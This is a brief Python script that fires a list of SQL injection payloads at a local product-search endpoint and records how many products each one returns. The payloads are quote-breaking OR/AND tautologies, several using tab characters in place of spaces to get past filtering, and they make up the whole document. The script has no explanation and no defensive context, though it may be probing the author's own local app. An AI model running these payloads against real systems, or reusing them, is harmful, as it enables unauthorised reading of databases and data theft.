import urllib.request, urllib.parse, json

def call(k):
    url = 'http://127.0.0.1:8081/api/products/search?keyword=' + urllib.parse.quote(k)
    try:
        r = urllib.request.urlopen(url)
        j = json.loads(r.read().decode('utf-8', 'replace'))
        prods = (j.get('data') or {}).get('products')
        print('KEY=', repr(k), 'STATUS=', r.status, 'SUCCESS=', j.get('success'), 'N=', len(prods) if prods is not None else None)
    except Exception as e:
        print('KEY=', repr(k), 'ERR=', type(e).__name__, str(e)[:200])

payloads = [
    "zzzz%'OR'1'='1'OR'1",
    "zzzz%'OR'1'='1'OR'2",
    "zzzz%'OR'1'='1'AND'1",
    "zzzz%'OR'1'='1'OR'1'='1",
    "zzzz%'OR'1'='1'OR'a'='a",
    "zzzz%'\tOR\t'1'='1",
    "zzzz%'\tOR\t'1'='2",
    "zzzz%'\tOR\t1=1\tAND\t'x%'='x",
]
for p in payloads:
    call(p)
